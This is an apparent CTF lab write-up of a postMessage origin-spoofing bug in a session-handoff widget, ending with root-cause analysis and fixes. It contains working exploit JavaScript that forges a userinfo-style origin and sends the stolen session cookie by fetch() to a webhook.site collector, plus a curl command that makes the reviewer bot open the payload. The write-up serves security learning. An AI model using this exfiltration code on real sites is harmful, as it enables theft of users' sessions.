# Portway Pwnbox Lab - postMessage Origin Trust Session Handoff Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: Client-side trust, postMessage origin spoofing, session token leakage, reviewer bot abuse

## Observation

Login app at `https://46fb2c180db4.pwnbox-lab.com/`.

Initial page hints:

- "A session-handoff SDK"
- partner apps embed the Portway widget to receive a signed session token via `postMessage`
- sandbox credentials: `demo / demo123`
- reviewers open reported partner URLs in a fresh session

Successful login set:

```text
portway_session=s_2f7fbfe77e54c1e5f496a1e91ca431e5
```

Dashboard exposed:

```javascript
window.Portway = {
   version: "2.1.4",
   region: "eu-west-1",
   endpoints: {
      session: "/api/session",
      handoff: "/embed/handoff"
   }
};
```

`/api/session` was a dead hint and returned `404`. The real handoff logic lived at `/embed/handoff`.

## Hypothesis

If the widget trusts attacker-controlled `message` data instead of the sender origin, then a malicious partner page may be able to claim an allowed origin and trick the handoff page into posting the session back to the attacker.

If the target origin string is only regex-checked, a userinfo-form origin such as `https://trusted@attacker` may pass the validator but still resolve to the attacker's real origin in `postMessage`.

## Evidence

### Vulnerable handoff widget

`GET /embed/handoff` returned:

```javascript
(function() {
   const ALLOWED = /^https?:\/\/[^.]+\.pwnbox\.io/;

   window.addEventListener("message", (m) => {
      const origin = m.data && m.data.origin;
      if (typeof origin === "string" && ALLOWED.test(origin)) {
         const target = window.opener || window.parent;
         target.postMessage({ session: document.cookie }, origin);
      }
   });
})();
```

### Trust boundary failure

The code checks:

```javascript
m.data.origin
```

instead of:

```javascript
m.origin
```

So the claimed origin is attacker-controlled.

### Weak allowlist

The regex:

```javascript
/^https?:\/\/[^.]+\.pwnbox\.io/
```

is only a prefix match. It accepts:

```text
https://partner.pwnbox.io@httpbin.org
```

because the string begins with `https://partner.pwnbox.io`, even though the real origin is `https://httpbin.org`.

### Iframe vs popup behavior

Self-testing showed the handoff path worked in an iframe, but only returned:

```json
{"session":""}
```

This indicated third-party cookie restrictions in the embedded context.

Switching to a popup made `/embed/handoff` load as a top-level Portway page in the reviewer session, which preserved the real Portway cookie.

## Test

Hosted attacker-controlled partner HTML on `https://httpbin.org/base64/...` that:

1. opened `https://46fb2c180db4.pwnbox-lab.com/embed/handoff` in a popup
2. repeatedly sent:

```javascript
{ origin: 'https://partner.pwnbox.io@httpbin.org' }
```

3. listened for the reply and exfiltrated `e.data` to a webhook collector

Minimal exploit structure:

```javascript
window.addEventListener('message', function(e) {
  fetch('https://webhook.site/[uuid]?d=' + encodeURIComponent(JSON.stringify(e.data)));
});

var w = window.open('https://46fb2c180db4.pwnbox-lab.com/embed/handoff', 'pw');
var n = 0;
var iv = setInterval(function() {
  try {
    w.postMessage({ origin: 'https://partner.pwnbox.io@httpbin.org' }, '*');
  } catch (e) {}
  if (++n > 30) clearInterval(iv);
}, 500);
```

Reported that partner URL through:

```bash
curl -sS -X POST "https://46fb2c180db4.pwnbox-lab.com/report" \
  -d "url=https://httpbin.org/base64/[payload]"
```

## Result

Webhook collector received repeated callbacks containing:

```text
{"session":"flag=pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}"}
```

## Conclusion

Confirmed client-side trust failure in the Portway handoff SDK. The widget trusted a forged `origin` field from attacker-controlled message data and used it as the `postMessage` `targetOrigin`. Because the allowlist was only a prefix regex, a userinfo-style value redirected the session handoff to the attacker's real origin.

## Root Cause

- Origin validation used `m.data.origin` instead of `m.origin`
- Allowed-origin validation used a prefix regex on a raw string
- `postMessage` was used to send raw session cookie data
- popup-based reviewer browsing supplied a fresh privileged session to the attacker page

## Failed Assumptions

- `/api/session` was not the live session handoff endpoint
- embedding in an iframe was insufficient because cookies were empty in third-party context

## Working Theory

The SDK author intended partner origins to self-identify, but the browser already provides the sender origin in the event object. Trusting the self-declared value let the attacker impersonate a trusted partner while steering delivery to their own origin.

## Flag

`pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}`

## Fix

- Validate `m.origin`, never a claimed origin inside `m.data`
- Parse and compare the normalized origin exactly
- Reject userinfo in trusted-origin checks
- Send scoped handoff tokens, not raw cookies
- Restrict reviewer/browser flows from opening arbitrary external partner pages with privileged sessions
